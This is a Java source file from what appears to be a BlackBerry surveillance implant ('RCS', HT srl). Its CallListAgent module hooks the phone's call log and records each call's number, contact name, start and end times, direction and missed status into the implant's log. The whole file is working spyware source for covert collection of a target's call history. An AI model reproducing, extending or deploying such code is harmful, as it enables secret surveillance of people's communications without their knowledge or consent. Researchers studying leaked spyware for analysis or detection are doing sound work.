//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallListAgent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import java.util.Date;

import net.rim.device.api.util.DataBuffer;

import blackberry.AppListener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.CallListObserver;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class CallListAgent.
 */
public final class CallListAgent extends Agent implements CallListObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);

    //#endif

    /**
     * Instantiates a new call list agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public CallListAgent(final boolean agentStatus) {
        super(Agent.AGENT_CALLLIST, agentStatus, true, "CallListAgent");

    }

    /**
     * Instantiates a new call list agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected CallListAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualStart() {
        AppListener.getInstance().addCallListObserver(this);
    }

    public void actualStop() {
        AppListener.getInstance().removeCallListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

    public void callLogAdded(String number, String name, Date date,
            int duration, boolean outgoing, boolean missed) {
        //#ifdef DEBUG_INFO
        debug.info("number: " + number + " date: " + date + " duration: "
                + duration);
        //#endif

        //#ifdef DBC
        Check.requires(number != null, "callLogAdded null number");
        Check.requires(name != null, "callLogAdded null name");
        //#endif

        final int LOG_CALLIST_VERSION = 0;

        int len = 28; //0x1C;
        byte[] data = new byte[len];

        final DataBuffer databuffer = new DataBuffer(data, 0, len, false);

        DateTime from = new DateTime(date);
        DateTime to = new DateTime(new Date(date.getTime() + duration));

        databuffer.writeInt(len);
        databuffer.writeInt(LOG_CALLIST_VERSION);
        databuffer.writeLong(from.getFiledate());
        databuffer.writeLong(to.getFiledate());

        int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
        databuffer.writeInt(flags);

        //#ifdef DBC
        Check.asserts(databuffer.getLength() == len,
                "callLogAdded: wrong len: " + databuffer.getLength());
        //#endif

        // Name
        int header = (0x01<<24) | (name.length() * 2);
        databuffer.writeInt(header);
        databuffer.write(WChar.getBytes(name, false));

        //Number
        header = (0x08<<24) | (number.length() * 2);
        databuffer.writeInt(header);
        databuffer.write(WChar.getBytes(number, false));

        log.createLog(getAdditionalData());
        log.writeLog(databuffer.getArray(), 0);
        log.close();
    }

    private byte[] getAdditionalData() {
        return null;
    }

}
